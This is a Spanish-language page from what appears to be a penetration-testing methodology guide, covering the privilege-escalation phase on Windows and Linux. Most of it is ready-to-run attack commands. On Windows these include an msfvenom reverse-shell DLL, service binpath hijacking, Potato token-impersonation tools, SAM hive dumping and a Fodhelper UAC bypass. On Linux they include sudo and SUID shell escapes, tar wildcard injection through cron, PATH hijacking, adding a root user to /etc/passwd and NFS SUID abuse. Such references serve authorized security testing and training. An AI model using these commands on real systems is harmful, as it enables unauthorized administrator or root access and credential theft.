# ⬆️ Fase 3: Escalada de privilegios

<!-- language-home-navigation -->
[🏠 Página principal en español](../../README.es.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe Sürüm](03-Privilege-Escalation.tr.md) • [🇬🇷 Ελληνικά](03-Privilege-Escalation.el.md)

```
  ██████╗ ██████╗ ██╗██╗   ██╗███████╗███████╗ ██████╗
  ██╔══██╗██╔══██╗██║██║   ██║██╔════╝██╔════╝██╔════╝
  ██████╔╝██████╔╝██║██║   ██║█████╗  ███████╗██║     
  ██╔═══╝ ██╔══██╗██║╚██╗ ██╔╝██╔══╝  ╚════██║██║     
  ██║     ██║  ██║██║ ╚████╔╝ ███████╗███████║╚██████╗
  ╚═╝     ╚═╝  ╚═╝╚═╝  ╚═══╝  ╚══════╝╚══════╝ ╚═════╝
```

**Objetivo:** Elevar los privilegios de usuario estándar a Administrator/SYSTEM (Windows) o root (Linux).

> 📚 **Guías completas:** [Windows PrivEsc](../../Windows-PrivEsc/translations/README.es.md) | [Linux PrivEsc](../../Linux-PrivEsc/translations/README.es.md)

---

## 🖥️ Escalada de privilegios en Windows

### Comprobaciones iniciales de resultados rápidos
```cmd
# Comprobar los privilegios actuales
whoami /priv
whoami /groups

# Comprobar credenciales almacenadas
cmdkey /list

# Archivos de instalación desatendida
dir /s C:\*unattend.xml C:\*sysprep.inf C:\*sysprep.xml 2>nul

# AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

### Explotación de servicios

#### Ruta de servicio sin comillas
```cmd
# Buscar rutas sin comillas
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows\\" | findstr /i /v """

# Si se encuentra: C:\Program Files\Some Service\service.exe
# Colocar el ejecutable malicioso en: C:\Program.exe o C:\Program Files\Some.exe
```

#### Permisos débiles en servicios
```cmd
# Comprobar los permisos del servicio con accesschk
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv "Users" * /accepteula

# Si existe SERVICE_CHANGE_CONFIG:
sc config VulnService binpath="C:\temp\shell.exe"
sc stop VulnService
sc start VulnService
```

#### Secuestro de DLL (DLL hijacking)
```powershell
# Buscar servicios con DLL ausentes (usar Process Monitor)
# Colocar una DLL maliciosa en el directorio del servicio
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f dll > evil.dll
```

### Suplantación de tokens

#### SeImpersonatePrivilege (ataques Potato)
```cmd
# Comprobar si se dispone de SeImpersonatePrivilege
whoami /priv

# PrintSpoofer (Windows 10/Server 2016-2019)
.\PrintSpoofer.exe -i -c cmd

# GodPotato (Windows 2012-2022)
.\GodPotato.exe -cmd "cmd /c whoami"
.\GodPotato.exe -cmd "C:\temp\shell.exe"

# JuicyPotato (Windows 7/Server 2008-2016)
.\JuicyPotato.exe -l 1337 -p C:\temp\shell.exe -t * -c {CLSID}
```

#### SeBackupPrivilege
```powershell
# Hacer una copia de SAM y SYSTEM
reg save HKLM\SAM C:\temp\SAM
reg save HKLM\SYSTEM C:\temp\SYSTEM

# Extraer los hashes en el equipo atacante
impacket-secretsdump -sam SAM -system SYSTEM LOCAL
```

### Explotación del Registro
```cmd
# AutoRun
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run

# Rutas de tareas programadas con permiso de escritura
schtasks /query /fo LIST /v | findstr /i "Task To Run"

# Permisos del Registro
accesschk.exe -kvw hklm\SOFTWARE
```

### Evasión de UAC
```powershell
# Evasión mediante Fodhelper (Windows 10)
New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value ""
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "cmd /c start C:\temp\shell.exe"
Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden
```

### Herramientas automatizadas
```bash
# WinPEAS
.\winPEAS.exe

# PowerUp
Import-Module .\PowerUp.ps1
Invoke-AllChecks

# Seatbelt
.\Seatbelt.exe -group=all

# Windows-Exploit-Suggester
python windows-exploit-suggester.py --systeminfo systeminfo.txt --database 2024.xlsx
```

---

## 🐧 Escalada de privilegios en Linux

### Comprobaciones iniciales de resultados rápidos
```bash
# Permisos de sudo
sudo -l

# Binarios SUID
find / -perm -4000 -type f 2>/dev/null

# /etc/passwd con permiso de escritura
ls -la /etc/passwd

# Versión del kernel para buscar exploits
uname -a
```

### Explotación de sudo

#### Sudo sin contraseña
```bash
# Si sudo -l muestra: (ALL) NOPASSWD: /usr/bin/vim
sudo vim -c '!sh'

# Si sudo -l muestra: (ALL) NOPASSWD: /usr/bin/find
sudo find . -exec /bin/sh \; -quit

# Si sudo -l muestra: (ALL) NOPASSWD: /usr/bin/python
sudo python -c 'import os; os.system("/bin/sh")'
```

#### Exploit de versión de sudo (CVE-2021-3156)
```bash
# Comprobar la versión de sudo
sudo --version

# Si sudo < 1.9.5p2
# Usar el exploit: https://github.com/blasty/CVE-2021-3156
```

### Binarios SUID/SGID
```bash
# Buscar binarios SUID
find / -perm -4000 -type f 2>/dev/null

# Consultar GTFOBins para su explotación
# https://gtfobins.github.io/

# Ejemplo: SUID en /usr/bin/find
/usr/bin/find . -exec /bin/sh -p \; -quit

# Ejemplo: SUID en /usr/bin/vim
/usr/bin/vim -c ':py import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")'

# Ejemplo: SUID en /usr/bin/python
/usr/bin/python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```

### Capabilities (capacidades de Linux)
```bash
# Buscar binarios con capabilities
getcap -r / 2>/dev/null

# Ejemplo: cap_setuid en python
/usr/bin/python -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

### Tareas de cron
```bash
# Comprobar las tareas de cron
cat /etc/crontab
ls -la /etc/cron.*

# Buscar scripts con permiso de escritura
# Inyección mediante comodines en tar:
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /path/shell.sh
touch "/path/--checkpoint=1"
touch "/path/--checkpoint-action=exec=sh shell.sh"
```

### Secuestro de PATH
```bash
# Si una tarea de cron o un script invoca un binario sin su ruta completa
# Crear un binario malicioso en un directorio de PATH con permiso de escritura

echo '/bin/bash -p' > /tmp/service
chmod +x /tmp/service
export PATH=/tmp:$PATH
```

### /etc/passwd con permiso de escritura
```bash
# Si /etc/passwd permite escritura
# Generar un hash de contraseña
openssl passwd -1 -salt evil password123

# Añadir un usuario root
echo 'evil:$1$evil$xyz...:0:0::/root:/bin/bash' >> /etc/passwd

# Cambiar al nuevo usuario root
su evil
```

### Exploits del kernel

> **Aclaración de versiones:** el intervalo resumido del ejemplo de Dirty Pipe no es una lista exacta de versiones vulnerables: la corrección llegó en 5.16.11, 5.15.25 y 5.10.102; también deben comprobarse los parches de la distribución. Véase el [informe original de Dirty Pipe](https://dirtypipe.cm4all.com/).

```bash
# Comprobar la versión del kernel
uname -r
cat /proc/version

# Buscar exploits
searchsploit linux kernel 4.4 privilege escalation

# Exploits conocidos del kernel:
# - DirtyCow (CVE-2016-5195) - Kernel 2.x - 4.x
# - DirtyPipe (CVE-2022-0847) - Kernel 5.8 - 5.16.11
```

### Explotación de NFS
```bash
# Comprobar no_root_squash
showmount -e 192.168.1.10
cat /etc/exports

# Si se configura no_root_squash:
# Montar el recurso compartido y crear un binario SUID como root
mount -t nfs 192.168.1.10:/share /mnt
cp /bin/bash /mnt/bash
chmod +s /mnt/bash

# En el objetivo:
/mnt/bash -p
```

### Herramientas automatizadas
```bash
# LinPEAS
./linpeas.sh

# LinEnum
./LinEnum.sh

# Linux-exploit-suggester
./linux-exploit-suggester.sh

# Linux Smart Enumeration (LSE)
./lse.sh -l 2
```

---

## 📊 Referencia rápida

### Lista de comprobación de Windows
```markdown
- [ ] whoami /priv (SeImpersonate, SeBackup, etc.)
- [ ] Rutas de servicios sin comillas
- [ ] Permisos débiles en servicios
- [ ] AlwaysInstallElevated
- [ ] Credenciales almacenadas (cmdkey /list)
- [ ] Archivos Unattend/Sysprep
- [ ] Tareas programadas
- [ ] Ejecutar WinPEAS/PowerUp
```

### Lista de comprobación de Linux
```markdown
- [ ] sudo -l
- [ ] Binarios SUID (consultar GTFOBins)
- [ ] Capabilities (capacidades de Linux)
- [ ] Tareas de cron (scripts modificables y comodines)
- [ ] /etc/passwd con permiso de escritura
- [ ] Versión del kernel (exploits)
- [ ] NFS no_root_squash
- [ ] Ejecutar LinPEAS
```

---

## 🔗 Guías de referencia relacionadas

- [Windows PrivEsc (guía completa)](../../Windows-PrivEsc/translations/README.es.md)
- [Linux PrivEsc (guía completa)](../../Linux-PrivEsc/translations/README.es.md)
- [Mimikatz](../../Mimikatz/translations/README.es.md)

---

**Fase anterior:** [← 02 - Enumeración](./02-Enumeration.es.md)

**Fase siguiente:** [04 - Movimiento lateral →](./04-Lateral-Movement.es.md)
